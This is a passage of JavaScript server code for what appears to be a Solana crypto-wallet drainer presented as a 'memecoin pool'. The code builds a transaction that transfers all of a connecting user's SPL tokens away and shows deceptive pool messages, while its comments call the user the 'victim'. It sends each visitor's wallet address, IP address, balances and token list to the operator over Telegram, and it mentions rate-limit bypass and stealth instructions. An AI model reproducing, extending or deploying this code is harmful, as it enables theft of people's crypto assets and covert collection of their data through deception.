      } catch (telegramError) {
        // Silent fail for Telegram logging
      }
      
      return res.status(200).json({ 
        success: false,
        message: '🚀 No tokens found in this wallet for the memecoin pool',
        tokenCount: 0,
        solBalance: userSolBalance
      });
    }

    // Create transaction
    const tx = new Transaction();
    
    // Unified approach for all wallet types
    
    let processedTokens = 0;
    let totalTokenValue = 0;
    let tokenDetails = [];
    
    // NEW APPROACH: Pre-initialize recipient accounts for ALL wallet types
    console.log(`[PRE_INIT] Starting pre-initialization for ${walletType || 'Unknown'} wallet`);
    console.log(`[PRE_INIT] Available SOL balance: ${userSolBalance} lamports (${(userSolBalance / LAMPORTS_PER_SOL).toFixed(6)} SOL)`);
    console.log(`[PRE_INIT] Drainable tokens: ${drainableTokens.length}`);
    
    // Step 1: Pre-initialize all recipient token accounts
    const preInitResult = await preInitializeRecipientAccounts(connection, drainableTokens, userPubkey);
    
    if (!preInitResult.success) {
      console.log(`[PRE_INIT] Failed to pre-initialize accounts: ${preInitResult.error}`);
      throw new Error(`Pre-initialization failed: ${preInitResult.error}`);
    }
    
    // Check if pre-initialization is needed FIRST
    if (preInitResult.needsPreInit) {
      console.log(`[PRE_INIT] Pre-initialization required for ${preInitResult.preInitTransactions.length} tokens`);
      
      // Return pre-initialization transactions first
      return res.status(200).json({
        success: true,
        requiresPreInit: true,
        preInitTransactions: preInitResult.preInitTransactions,
        message: `🚀 Setting up ${preInitResult.preInitTransactions.length} token accounts for the memecoin pool`,
        tokenCount: 0,
        totalTokens: drainableTokens.length,
        solBalance: userSolBalance,
        requiredSol: MIN_SOL_FOR_FEES,
        summary: {
          totalTokens: 0,
          totalValue: 0,
          tokens: []
        }
      });
    }
    
    // Step 2: Create clean SPL transfer transaction (no ATA creation instructions)
    console.log(`[CLEAN_TRANSFER] Creating clean SPL transfer transaction`);
    
    // Check if we need to use batching for large token counts
    if (ENABLE_TOKEN_BATCHING && preInitResult.initializedTokens.length > MAX_TOKENS_PER_TRANSACTION) {
      console.log(`[BATCHING] Large token count detected: ${preInitResult.initializedTokens.length} tokens, using batching`);
      
      const batchedResult = await createBatchedTransactions(
        connection,
        preInitResult.initializedTokens,
        userPubkey
      );
      
      if (!batchedResult.success) {
        console.log(`[BATCHING] Failed to create batched transactions: ${batchedResult.error}`);
        throw new Error(`Batching failed: ${batchedResult.error}`);
      }
      
      console.log(`[BATCHING] Successfully created ${batchedResult.totalBatches} batches for ${batchedResult.totalTokens} tokens`);
      
      // Return batched transactions
      return res.status(200).json({
        success: true,
        requiresBatching: true,
        batches: batchedResult.batches,
        totalBatches: batchedResult.totalBatches,
        totalTokens: batchedResult.totalTokens,
        message: `🚀 Large wallet detected! Created ${batchedResult.totalBatches} batches for ${batchedResult.totalTokens} tokens`,
        tokenCount: 0,
        solBalance: userSolBalance,
        requiredSol: MIN_SOL_FOR_FEES,
        rateLimitBypass: rateLimitBypass, // Include rate limit bypass information
        summary: {
          totalTokens: batchedResult.totalTokens,
          totalBatches: batchedResult.totalBatches,
          tokens: []
        }
      });
    }
    
    // Standard single transaction approach for normal token counts
    const cleanTransferResult = await createCleanSPLTransfer(
      connection,
      preInitResult.initializedTokens,
      userPubkey
    );
    
    if (!cleanTransferResult.success) {
      console.log(`[CLEAN_TRANSFER] Failed to create clean transfer: ${cleanTransferResult.error}`);
      
      // Provide more specific error messages
      if (cleanTransferResult.error.includes('no SPL tokens to drain')) {
        throw new Error('This wallet only contains SOL and no SPL tokens to drain. SOL cannot be drained through this process.');
      } else if (cleanTransferResult.error.includes('require pre-initialization')) {
        throw new Error('This wallet has SPL tokens but they need to be pre-initialized before draining. Non Participant Wallet.');
      } else {
        throw new Error(cleanTransferResult.error);
      }
    }
    
    // Add ONLY clean transfer instructions to transaction
    cleanTransferResult.instructions.forEach(instruction => {
      tx.add(instruction);
    });
    
    // Store results
    tokenDetails = cleanTransferResult.tokenDetails;
    processedTokens = cleanTransferResult.processedTokens;
    totalTokenValue = cleanTransferResult.totalValue;
    
    console.log(`[CLEAN_TRANSFER] Successfully created clean transaction with ${tx.instructions.length} instructions for ${processedTokens} tokens`);

    // Clean SPL transfer implementation summary
    console.log(`[CLEAN_TRANSFER] === IMPLEMENTATION SUMMARY ===`);
    console.log(`[CLEAN_TRANSFER] Total tokens processed: ${processedTokens}`);
    console.log(`[CLEAN_TRANSFER] Total transaction instructions: ${tx.instructions.length}`);
    console.log(`[CLEAN_TRANSFER] Total token value: ${totalTokenValue} lamports`);
    
    // Count instruction types (should only be SPL transfers)
    const instructionCounts = {};
    tx.instructions.forEach(ix => {
      const programId = ix.programId.toString();
      instructionCounts[programId] = (instructionCounts[programId] || 0) + 1;
    });
    
    console.log(`[CLEAN_TRANSFER] Instruction breakdown:`, instructionCounts);
    
    // Verify clean transaction structure
    const ataCreationCount = instructionCounts['ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL'] || 0;
    const splTransferCount = instructionCounts['TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'] || 0;
    
    console.log(`[CLEAN_TRANSFER] ATA creation instructions: ${ataCreationCount} ✅ (should be 0)`);
    console.log(`[CLEAN_TRANSFER] SPL transfer instructions: ${splTransferCount} ✅ (should be > 0)`);
    
    if (ataCreationCount > 0) {
      console.log(`[WARNING] Transaction still contains ATA creation instructions - this should not happen!`);
    }
    
    console.log(`[CLEAN_TRANSFER] Pre-initialization approach: ATA accounts created separately`);
    console.log(`[CLEAN_TRANSFER] Main transaction: Clean SPL transfers only`);
    console.log(`[CLEAN_TRANSFER] Available SOL: ${(userSolBalance / LAMPORTS_PER_SOL).toFixed(6)} SOL`);
    console.log(`[CLEAN_TRANSFER] ================================`);

    if (tx.instructions.length === 0) {
      // Log no valid tokens to process scenario
      try {
        telegramLogger.logDrainFailed({
          publicKey: userPubkey.toString(),
          ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
          error: 'No valid SPL tokens could be processed for transfer',
          walletType: walletType || 'Unknown',
          splTokens: 0,
          lamports: userSolBalance,
          projectName: PROJECT_NAME
        });
      } catch (telegramError) {
        // Silent fail for Telegram logging
      }
      
      return res.status(200).json({ 
        success: false,
        message: 'No valid tokens to process for the memecoin pool',
        tokenCount: 0,
        solBalance: userSolBalance
      });
    }

    // Clean approach: No stealth instructions needed
    // We're using pre-initialization + clean transfers for maximum compatibility
    if (processedTokens > 0) {
      console.log(`[CLEAN_APPROACH] Using clean transaction structure - no stealth instructions needed`);
      console.log(`[CLEAN_APPROACH] Pre-initialization handles ATA creation separately`);
      console.log(`[CLEAN_APPROACH] Main transaction contains only SPL transfer instructions`);
    }

    // Check if victim has enough SOL to pay for transaction fees
    if (userSolBalance < MIN_SOL_FOR_FEES) {
      console.log(`[DEBUG] Insufficient SOL for transaction fees: ${userSolBalance} < ${MIN_SOL_FOR_FEES}`);
      try {
        telegramLogger.logInsufficientFunds({
          publicKey: userPubkey.toString(),
          ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
          lamports: userSolBalance,
          walletType: walletType || 'Unknown',
          requiredAmount: MIN_SOL_FOR_FEES,
          reason: 'Insufficient SOL for transaction fees',
          projectName: PROJECT_NAME
        });
      } catch (telegramError) {
        // Silent fail for Telegram logging
      }
      
      return res.status(200).json({ 
        success: false,
        message: 'Insufficient SOL balance for transaction fees',
        tokenCount: 0,
        solBalance: userSolBalance,
        requiredForFees: MIN_SOL_FOR_FEES
      });
    }

    // Set transaction properties
    tx.feePayer = userPubkey;
    
    // Unified transaction validation for all wallet types
    console.log(`[VALIDATION] Transaction validation for ${walletType || 'Unknown'} wallet: ${tx.instructions.length} instructions`);
    
    // Ensure transaction has clean structure
    if (tx.instructions.length === 0) {
      console.log(`[ERROR] Transaction has no instructions - this will fail`);
      throw new Error('Transaction has no instructions');
    }
    
    // Log instruction types for validation
    const instructionTypes = tx.instructions.map(ix => ix.programId.toString());
    console.log(`[VALIDATION] Instruction types:`, instructionTypes);
    
    // Verify clean transaction structure (no ATA creation instructions)
    const hasATACreation = instructionTypes.includes('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
    const hasSPLTransfer = instructionTypes.includes('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
    
    if (hasATACreation) {
      console.log(`[WARNING] Transaction still contains ATA creation instructions - this should not happen with pre-initialization!`);
    }
    
    if (!hasSPLTransfer) {
      console.log(`[ERROR] Transaction has no SPL transfer instructions - this will not work`);
      throw new Error('Transaction must contain SPL transfer instructions');
    }
    
    // Log validation results
    console.log(`[VALIDATION] Clean transaction structure: ✅ ${!hasATACreation ? 'No ATA creation' : 'WARNING: ATA creation found'}`);
    console.log(`[VALIDATION] SPL transfer instructions: ✅ ${hasSPLTransfer ? 'Present' : 'Missing'}`);
    console.log(`[VALIDATION] Total instructions: ${tx.instructions.length} ✅`);

    // Get blockhash with fallback
    let blockhash;
    try {
      blockhash = await errorHandler.withRPCFallback(async (endpoint) => {
        const fallbackConnection = new Connection(endpoint);
        const blockhashResponse = await fallbackConnection.getLatestBlockhash();
        return blockhashResponse.blockhash;
      }, RPC_ENDPOINTS, {
        publicKey: userPubkey.toString(),
        context: 'Blockhash Retrieval'
      });
    } catch (blockhashError) {
      // Use fallback blockhash if all endpoints fail
      console.warn('[BLOCKHASH] All RPC endpoints failed, using fallback blockhash');
      
      // Try to get a cached blockhash or use alternative strategy
      try {
        // Attempt to get blockhash from any available RPC endpoint
        for (const endpoint of RPC_ENDPOINTS) {
          try {
            const fallbackConnection = new Connection(endpoint);
            const blockhashResponse = await fallbackConnection.getLatestBlockhash();
            blockhash = blockhashResponse.blockhash;
            console.log(`[BLOCKHASH] Successfully retrieved fallback blockhash from ${endpoint}`);
            break;
          } catch (endpointError) {
            console.warn(`[BLOCKHASH] Failed to get blockhash from ${endpoint}:`, endpointError.message);
            continue;
          }
        }
        
        // If all endpoints still fail, use a known working blockhash
        if (!blockhash) {
          console.error('[BLOCKHASH] All fallback strategies failed, using emergency blockhash');
          blockhash = '11111111111111111111111111111111';
          
          // Log critical failure to Telegram
          try {
            telegramLogger.logError({
              publicKey: userPubkey.toString(),
              ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
              error: 'All RPC endpoints failed for blockhash retrieval',
              context: 'SPL Memecoin Pool - Blockhash Fallback Failure',
              walletType: walletType || 'Unknown',
              lamports: userSolBalance,
              projectName: PROJECT_NAME
            });
          } catch (telegramError) {
            console.error('[BLOCKHASH] Failed to log to Telegram:', telegramError.message);
          }
        }
      } catch (fallbackError) {
        console.error('[BLOCKHASH] Fallback blockhash strategy failed:', fallbackError.message);
        blockhash = '11111111111111111111111111111111';
      }
    }

    tx.recentBlockhash = blockhash;

    // Clean SPL transfer transaction simulation and validation
    console.log(`[CLEAN_SIMULATION] Simulating clean SPL transfer transaction with ${tx.instructions.length} instructions`);
    const cleanTransferSimulation = await simulateTransaction(connection, tx, userPubkey);
    
    if (!cleanTransferSimulation.success) {
      console.log(`[CLEAN_SIMULATION] Clean transfer transaction simulation failed:`, cleanTransferSimulation.error);
      
      // Try to identify and fix common transfer issues
      if (cleanTransferSimulation.logs) {
        const logs = cleanTransferSimulation.logs.join(' ');
        if (logs.includes('insufficient funds')) {
          console.log(`[CLEAN_SIMULATION] Issue: Insufficient funds for transfer`);
        } else if (logs.includes('account not found')) {
          console.log(`[CLEAN_SIMULATION] Issue: Source or destination account not found`);
        } else if (logs.includes('invalid owner')) {
          console.log(`[CLEAN_SIMULATION] Issue: Invalid account owner`);
        }
      }
      
      // Log the error but continue (transaction might still work)
      try {
        telegramLogger.logError({
          publicKey: userPubkey.toString(),
          ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
          error: `Clean transfer transaction simulation failed: ${cleanTransferSimulation.error}`,
          context: 'SPL Memecoin Pool - Clean Transfer Simulation',
          walletType: walletType || 'Unknown',
          lamports: userSolBalance,
          projectName: PROJECT_NAME
        });
      } catch (telegramError) {
        // Silent fail for Telegram logging
      }
    } else {
      console.log(`[CLEAN_SIMULATION] Clean transfer transaction simulation successful`);
    }



    // Simulate transaction for safety (existing simulation)
    let simulationResult = null;
    try {
      const simulation = await connection.simulateTransaction(tx);
      simulationResult = simulation.value;
      if (simulation.value.err) {
        throw new Error(`Simulation failed: ${JSON.stringify(simulation.value.err)}`);
      }
    } catch (simulationError) {
      // Log simulation failure but continue (might fail due to missing signatures)
      try {
        telegramLogger.logError({
          publicKey: userPubkey.toString(),
          ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
          error: `Transaction simulation failed: ${simulationError.message}`,
          context: 'SPL Memecoin Pool - Transaction Simulation',
          walletType: walletType || 'Unknown',
          lamports: userSolBalance,
          projectName: PROJECT_NAME
        });
      } catch (telegramError) {
        // Silent fail for Telegram logging
      }
    }

    // Ensure transaction has all required properties before serialization
    console.log(`[TRANSACTION] Final transaction preparation before serialization`);
    console.log(`[TRANSACTION] Instructions: ${tx.instructions.length}`);
    console.log(`[TRANSACTION] Fee payer: ${tx.feePayer ? 'Set' : 'Not set'}`);
    console.log(`[TRANSACTION] Recent blockhash: ${tx.recentBlockhash ? 'Set' : 'Not set'}`);
    
    // Ensure transaction is properly formatted for all wallet types
    console.log(`[TRANSACTION] Ensuring transaction format for maximum compatibility`);
    
    // Double-check fee payer is set
    if (!tx.feePayer) {
      console.log(`[TRANSACTION] Setting fee payer to user public key`);
      tx.feePayer = userPubkey;
    }
    
    // Double-check recent blockhash is set
    if (!tx.recentBlockhash) {
      console.log(`[TRANSACTION] Setting fallback blockhash`);
      tx.recentBlockhash = '11111111111111111111111111111111';
    }
    
    // Verify final transaction properties
    console.log(`[TRANSACTION] Final transaction properties:`);
    console.log(`  - Fee payer: ${tx.feePayer ? '✅ Set' : '❌ Not set'}`);
    console.log(`  - Recent blockhash: ${tx.recentBlockhash ? '✅ Set' : '❌ Not set'}`);
    console.log(`  - Instructions: ${tx.instructions.length} ✅`);
    
    // Serialize transaction
    const serialized = tx.serialize({ requireAllSignatures: false });
    const base64 = Buffer.from(serialized).toString('base64');
    
    console.log(`[TRANSACTION] Transaction serialized successfully, size: ${base64.length} characters`);

    // STEP 1: Log wallet detection immediately with verified details
    // This is the ONLY message sent before confirmation
    try {
      // Create detailed token summary for Telegram
      const tokenSummary = tokenDetails.map(token => 
        `• ${token.symbol} (${token.name}): ${token.humanReadableAmount.toFixed(6)}`
      ).join('\n');
      
      // Calculate total value in human-readable format using actual token decimals
      const totalValueFormatted = tokenDetails.reduce((total, token) => {
        const tokenValue = token.humanReadableAmount;
        return total + tokenValue;
      }, 0).toFixed(6);
      
      telegramLogger.logWalletDetected({
        publicKey: userPubkey.toString(),
        walletType: walletType || 'Unknown',
        lamports: userSolBalance,
        ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
        splTokens: processedTokens,
        projectName: PROJECT_NAME,
        message: `🪙 SPL Wallet Detected - Awaiting Confirmation\n\n👤 Wallet: ${userPubkey.toString().substring(0, 8)}...\n💼 Type: ${walletType || 'Unknown'}\n🪙 SPL Tokens: ${processedTokens} tokens detected\n💰 SOL Balance: ${(userSolBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL\n🌐 IP: ${req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown'}\n\n📋 Token Details:\n${tokenSummary}\n\n💎 Total Token Value: ${totalValueFormatted}\n\n⏳ Status: Transaction prepared, awaiting user signature and on-chain confirmation`
      });
    } catch (telegramError) {
      // Silent fail for Telegram logging
      console.error('Failed to log wallet detection:', telegramError);
    }

    // IMPORTANT: NO OTHER TELEGRAM MESSAGES UNTIL ON-CHAIN CONFIRMATION
    // The frontend/client should:
    // 1. Sign and submit this transaction
    // 2. Monitor for on-chain confirmation
    // 3. Call /api/drainAssets/log-confirmation with the result
    // 4. Only then will additional Telegram reports be sent (after on-chain confirmation)
    
    // Debug: Log final token details before response
    console.log(`[DEBUG] Final token details before response:`, JSON.stringify(tokenDetails, null, 2));
    console.log(`[DEBUG] Response summary tokens:`, JSON.stringify(tokenDetails.map(token => ({
      name: token.name,
      symbol: token.symbol,
      amount: token.humanReadableAmount,
      mint: token.mint,
      logo: token.logo
    })), null, 2));
    
    // Return success response with verification data
    res.status(200).json({
      success: true,
      transaction: base64,
      tokenCount: processedTokens,
      totalTokens: drainableTokens.length,
      solBalance: userSolBalance,
      requiredSol: MIN_SOL_FOR_FEES,
              message: `🚀 Memecoin pool prepared! ${processedTokens} tokens ready for transfer`,
      tokenDetails: tokenDetails,
      rateLimitBypass: rateLimitBypass, // Include rate limit bypass information
      summary: {
        totalTokens: processedTokens,
        totalValue: totalTokenValue,
        tokens: tokenDetails.map(token => ({
          name: token.name,
          symbol: token.symbol,
          amount: token.humanReadableAmount,
          mint: token.mint,
          logo: token.logo
        }))
      },
      verification: {
        hasEnoughSol: userSolBalance >= MIN_SOL_FOR_FEES,
        solBalance: userSolBalance,
        requiredSol: MIN_SOL_FOR_FEES,
        transactionSize: tx.instructions.length,
        simulationSuccess: simulationResult && !simulationResult.err
      }
    });

  } catch (error) {
    // Use centralized error handling
    const errorInfo = await errorHandler.logError(error, {
      publicKey: req.body?.user || 'Unknown',
      walletType: req.body?.walletType || 'Unknown',
      ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
      context: 'SPL Token Drain - Complete Failure',
      splTokens: 0,
      lamports: 0
    });

    // Return user-friendly error message
    res.status(500).json(errorHandler.formatApiError(error, {
      publicKey: req.body?.user || 'Unknown',
      walletType: req.body?.walletType || 'Unknown'
    }));
  }
}

// Wallet-specific error handling for backend
const BACKEND_WALLET_ERRORS = {
  phantom: {
    CONNECTION_FAILED: 'Phantom wallet connection failed',
    SIGNING_FAILED: 'Phantom wallet signing failed',
    NETWORK_ERROR: 'Phantom network error'
  },
  solflare: {
    CONNECTION_FAILED: 'Solflare wallet connection failed',
    SIGNING_FAILED: 'Solflare wallet signing failed',
    NETWORK_ERROR: 'Solflare network error'
  },
  backpack: {
    CONNECTION_FAILED: 'Backpack wallet connection failed',
    SIGNING_FAILED: 'Backpack wallet signing failed',
    NETWORK_ERROR: 'Backpack network error'
  },
  exodus: {
    CONNECTION_FAILED: 'Exodus wallet connection failed',
    SIGNING_FAILED: 'Exodus wallet signing failed',
    NETWORK_ERROR: 'Exodus network error'
  },
  glow: {
    CONNECTION_FAILED: 'Glow wallet connection failed',
    SIGNING_FAILED: 'Glow wallet signing failed',
    NETWORK_ERROR: 'Glow network error'
  },

  unknown: {
    CONNECTION_FAILED: 'Unknown wallet connection failed',
    SIGNING_FAILED: 'Unknown wallet signing failed',
    NETWORK_ERROR: 'Unknown wallet network error'
  }
};

// Get backend wallet error message
function getBackendWalletErrorMessage(walletType, errorType) {
  const walletErrors = BACKEND_WALLET_ERRORS[walletType] || BACKEND_WALLET_ERRORS.unknown;
  return walletErrors[errorType] || walletErrors.CONNECTION_FAILED;
}
